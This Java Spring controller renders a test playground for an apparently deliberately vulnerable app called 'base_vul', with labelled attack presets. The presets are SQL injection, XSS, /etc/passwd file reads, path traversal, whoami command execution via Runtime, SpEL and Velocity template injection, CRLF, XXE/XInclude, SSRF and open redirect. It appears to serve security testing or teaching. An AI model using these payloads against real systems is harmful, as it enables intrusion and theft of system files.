package com.myapp.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class PlaygroundController {

    @GetMapping(value = {"/", "/playground"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        String xmlPayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >< !ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>".replace("< !", "<!");
        String xmlXIncludePayload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY >< !ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/><data>&xxe;</data></foo>".replace("< !", "<!");

        return "<!DOCTYPE html>" +
                "<html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>base_vul Playground</title>" +
                style() +
                "</head><body><div class=\"container\"><h1>base_vul Playground</h1>" +
                "<p class=\"hint\">Select a preset scenario, then adjust the method, path, content type, or body before sending. File upload scenarios use the file picker below.</p>" +
                "<label for=\"scenario\">Scenario</label><select id=\"scenario\"></select>" +
                "<label for=\"method\">Method</label><input id=\"method\" value=\"GET\" />" +
                "<label for=\"path\">Path</label><input id=\"path\" value=\"/users/1/\" />" +
                "<label for=\"contentType\">Content-Type</label><input id=\"contentType\" value=\"application/json\" />" +
                "<label for=\"body\">Request Body</label><textarea id=\"body\"></textarea>" +
                "<label for=\"file\">Upload File</label><input id=\"file\" type=\"file\" />" +
                "<div class=\"actions\"><button class=\"fill\" onclick=\"fillSelected()\">Fill Selected Scenario</button><button class=\"send\" onclick=\"sendCurrent()\">Send Current Request</button></div>" +
                "<label for=\"result\">Response</label><pre id=\"result\">Waiting for request...</pre></div>" +
                "<script>const scenarios=[" +
                scenario("SQLi users/{id} attack", "GET", "/users/1'/", "application/json", "", false) + "," +
                scenario("SQLi users/{id} normal", "GET", "/users/1/", "application/json", "", false) + "," +
                scenario("SQLi object attack", "POST", "/users/get_name_object", "application/json", "{\"name\":\"test'\"}", false) + "," +
                scenario("SQLi object normal", "POST", "/users/get_name_object", "application/json", "{\"name\":\"test\"}", false) + "," +
                scenario("SQLi lombok attack", "POST", "/users/lombok", "application/json", "{\"name\":\"test'\"}", false) + "," +
                scenario("XSS reflect attack", "GET", "/xss_reflect?name=<script>alert(123)</script>", "application/json", "", false) + "," +
                scenario("XSS DOM attack", "POST", "/xss_dom", "application/x-www-form-urlencoded", "name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E", false) + "," +
                scenario("File upload attack", "POST", "/file_upload", "multipart/form-data", "", true) + "," +
                scenario("File read attack", "GET", "/file_read?filePath=/etc/passwd", "application/json", "", false) + "," +
                scenario("File download attack", "GET", "/file_download?fileName=../pom.xml", "application/json", "", false) + "," +
                scenario("Runtime command attack", "GET", "/runtime_command_execute?command=whoami", "application/json", "", false) + "," +
                scenario("ProcessBuilder attack", "GET", "/process_builder_command_execute?command=whoami", "application/json", "", false) + "," +
                scenario("CRLF injection attack", "GET", "/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SpEL attack", "GET", "/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami')", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSRF openStream attack", "GET", "/ssrf_openStream?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("SSTI velocity attack", "GET", "/ssti_velocity?content=%23set (%24exp %3d \"exp\")%3b%24exp.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("XXE documentbuilderfactory attack", "POST", "/xxe_documentbuilderfactory", "application/xml", xmlPayload, false) + "," +
                scenario("XXE xinclude attack", "POST", "/xxe_documentbuilderfactory_xinclude", "application/xml", xmlXIncludePayload, false) + "," +
                scenario("Open redirect attack", "GET", "/OpenRedirector_ModelAndView?url=https://www.baidu.com", "application/x-www-form-urlencoded", "", false) + "," +
                scenario("swagger-ui attack", "GET", "/swagger-ui.html", "application/x-www-form-urlencoded", "", false) +
                "];" +
                commonScript() +
                "</script></body></html>";
    }

    private String scenario(String name, String method, String path, String contentType, String body, boolean useFile) {
        return "{name:'" + esc(name) + "',method:'" + esc(method) + "',path:'" + esc(path) + "',contentType:'" + esc(contentType) + "',body:'" + esc(body) + "',useFile:" + useFile + "}";
    }

    private String commonScript() {
        return "const scenarioBox=document.getElementById('scenario');const methodBox=document.getElementById('method');const pathBox=document.getElementById('path');const contentTypeBox=document.getElementById('contentType');const bodyBox=document.getElementById('body');const fileBox=document.getElementById('file');const resultBox=document.getElementById('result');" +
                "scenarios.forEach((item,index)=>{const option=document.createElement('option');option.value=index;option.textContent=item.name;scenarioBox.appendChild(option);});" +
                "function fillScenario(index){const item=scenarios[index];methodBox.value=item.method;pathBox.value=item.path;contentTypeBox.value=item.contentType;bodyBox.value=item.body;}" +
                "function fillSelected(){fillScenario(scenarioBox.value||0);}" +
                "async function sendCurrent(){resultBox.textContent='Request in progress...';try{const method=methodBox.value.trim().toUpperCase();const path=pathBox.value.trim();const contentType=contentTypeBox.value.trim();let response;if(contentType==='multipart/form-data'){const formData=new FormData();if(fileBox.files.length>0){formData.append('file',fileBox.files[0]);}response=await fetch(path,{method:method,body:formData});}else{const options={method:method,headers:{}};if(method!=='GET'&&bodyBox.value!==''){options.body=bodyBox.value;if(contentType!==''){options.headers['Content-Type']=contentType;}}response=await fetch(path,options);}const text=await response.text();resultBox.textContent='HTTP '+response.status+'\\n'+text;}catch(error){resultBox.textContent='Request failed: '+error;}}" +
                "fillScenario(0);";
    }

    private String style() {
        return "<style>body{font-family:Arial,sans-serif;margin:40px;background:#f5f7fb;color:#1f2937;}.container{max-width:980px;margin:0 auto;background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.08);}input,textarea,select,pre{width:100%;box-sizing:border-box;}input,textarea,select{padding:12px;border-radius:8px;border:1px solid #d0d7de;margin-bottom:16px;}textarea{min-height:180px;resize:vertical;}pre{min-height:180px;padding:12px;border-radius:8px;background:#111827;color:#e5e7eb;overflow:auto;}.actions{display:flex;gap:12px;margin:20px 0;}button{padding:12px 18px;border:0;border-radius:8px;cursor:pointer;font-size:14px;color:#fff;}.fill{background:#1f6feb;}.send{background:#111827;}.hint{color:#6b7280;font-size:14px;}</style>";
    }

    private String esc(String value) {
        return value.replace("\\", "\\\\").replace("'", "\\'").replace("\r", "").replace("\n", "\\n");
    }
}
